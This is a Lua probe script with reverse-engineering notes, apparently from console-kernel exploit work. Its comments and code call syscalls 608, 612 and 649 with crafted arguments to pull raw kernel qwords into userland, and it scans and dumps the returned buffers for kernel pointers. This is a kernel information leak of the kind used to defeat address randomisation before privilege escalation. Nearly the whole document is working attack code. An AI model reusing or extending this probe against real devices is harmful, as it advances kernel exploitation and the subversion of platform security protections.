-- CRASH_CLASS: LOW (fixed 0x1a8 record copyout into a mapped 0x400 buffer; size gate honoured)
-- PROBE 1198a: sys 608 dynlib_get_info_ex, recovered from the 13.60 body at 0x8ad0bdc0.
-- ABI: uap+0x00 = module id (u32), uap+0x08 = flags (u32), uap+0x10 = pointer to a caller struct
-- whose FIRST QWORD must be 0x1a8 (the record size the handler expects) or it returns EINVAL.
-- The handler mallocs 0x1a8, bzeroes it, fills it from the module list entry r15 and then
--   copyout(rec, uap+0x10, 0x1a8);  free(rec, 0x1a8, 0xa);
-- The fields it copies RAW out of the kernel entry are the ones 660 hashed away:
--   +0x110 = [r15+0x78]   +0x128 = [r15+0xe8]   +0x130 = [r15+0xf0]
--   +0x148 = [r15+0xf8]   +0x150 = [r15+0x108]
-- so this is the first converter in the dynlib family that can put an unmodified kernel qword into
-- userland. Phase A dumps the whole record for the three live module ids, phase B tries the 0x10
-- size gate on 612 get_proc_type_info, phase C sweeps 649 dynlib_get_obj_member for a live member.
print("=== PROBE 1198a: sys 608 dynlib_get_info_ex RECORDS ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function U(v) return uint64(string.format("0x%08X%08X", math.floor(N(v)/4294967296), N(v) % 4294967296)) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a, U(v)) end) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "?" end
local HO = string.format("%08X", math.floor(0/1))
local function hx32(v) local hi = math.floor(v/65536) local lo = v - hi*65536 return string.format("%04X%04X", hi, lo) end
local function hx64(lo,hi) return string.format("%08X%08X", hi % 4294967296, lo % 4294967296) end
local B = N(memory.alloc(0x400))
local B2 = N(memory.alloc(0x400))
local function sent(a,n) for o=0,(n or 0x3FC)-1,4 do wd(a+o,0xA5A5A5A5) end end
local function dump(a,n,label)
  for o=0,n-1,16 do
    local s = {}
    for k=0,3 do
      local lo = rd(a+o+k*4) local hi = rd(a+o+k*4+4)
      s[#s+1] = hx64(lo or 0, hi or 0)
    end
    print(string.format("   %s +%03X  %s %s %s %s", label, o, s[1], s[2], s[3], s[4]))
  end
end
local function kscan(a,n)
  local out = {}
  for o=0,n-8,8 do
    local lo = rd(a+o) local hi = rd(a+o+4)
    if lo and hi and hi >= 0xFFFF8000 then out[#out+1] = string.format("+%03X=%s", o, hx64(lo,hi)) end
  end
  return #out > 0 and table.concat(out," ") or "(none)"
end
-- ---------- phase A: 608 ----------
local s608 = mk(608)
for _, id in ipairs({0, 0x13, 0x14}) do
  for _, fl in ipairs({0, 1, 2, 3}) do
    sent(B, 0x3FC)
    wq(B, 0x1a8)
    local ok, rv = pcall(function() return s608(U(id), U(fl), U(B), U(0), U(0)) end)
    local r = ok and N(rv) or -999
    if r == 0 then
      print(string.format("[A] 608(id=%02X flags=%d) rv=0 KERNEL-QWORDS: %s", id, fl, kscan(B,0x1a8)))
      dump(B, 0x1a8, string.format("id%02X.f%d", id, fl))
    else
      print(string.format("[A] 608(id=%02X flags=%d) rv=%d errno=%s", id, fl, r, es()))
    end
  end
end
-- ---------- phase B: 612 get_proc_type_info ----------
local s612 = mk(612)
sent(B2, 0x3FC)
wq(B2, 0x10)
for _, shape in ipairs({1,2,3}) do
  sent(B, 0x3FC)
  local ok, rv
  if shape == 1 then ok, rv = pcall(function() return s612(U(B2), U(B), U(0), U(0), U(0)) end)
  elseif shape == 2 then ok, rv = pcall(function() return s612(U(B), U(B2), U(0), U(0), U(0)) end)
  else ok, rv = pcall(function() return s612(U(B2), U(0), U(0), U(0), U(0)) end) end
  local r = ok and N(rv) or -999
  print(string.format("[B] 612 shape%d rv=%d errno=%s kq=%s", shape, r, es(), r==0 and kscan(B,0x100) or "-"))
  if r == 0 then dump(B, 0x80, string.format("612.s%d", shape)) end
end
-- ---------- phase C: 649 dynlib_get_obj_member ----------
local s649 = mk(649)
for _, id in ipairs({0, 0x13, 0x14}) do
  for idx=0,7 do
    sent(B, 0x3FC)
    local ok, rv = pcall(function() return s649(U(id), U(idx), U(B), U(0), U(0)) end)
    local r = ok and N(rv) or -999
    if r ~= -1 then
      print(string.format("[C] 649(id=%02X idx=%d) rv=%d errno=%s kq=%s", id, idx, r, es(), kscan(B,0x100)))
      if r == 0 then dump(B, 0x80, string.format("649.%02X.%d", id, idx)) end
    end
  end
end
print("[SUM] 649 sweep complete")
print("[Z] alive")
print("=== DONE ===")
